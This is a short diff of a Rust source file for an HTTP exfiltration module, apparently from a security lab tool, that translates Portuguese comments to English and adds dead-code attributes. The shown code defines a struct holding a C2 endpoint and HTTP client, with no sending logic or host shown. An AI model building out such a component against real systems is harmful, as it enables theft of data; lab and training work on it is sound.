@@ -1,10 +1,10 @@
-//! Exfiltração HTTP
+//! HTTP Exfiltration
 //!
-//! Envia dados via HTTP para servidor C2 (mock para lab).
+//! Sends data via HTTP to C2 server (mock for lab).
 
 use super::{ExfilError, Exfiltrator};
 
-/// Exfiltrador HTTP
+#[allow(dead_code)]
 pub struct HttpExfiltrator {
     /// URL do endpoint
     endpoint: String,
@@ -13,8 +13,8 @@ pub struct HttpExfiltrator {
     client: reqwest::Client,
 }
 
+#[allow(dead_code)]
 impl HttpExfiltrator {
-    /// Cria novo exfiltrador HTTP
     pub fn new(endpoint: &str) -> Self {
         let client = reqwest::Client::builder()
             .timeout(std::time::Duration::from_secs(30))
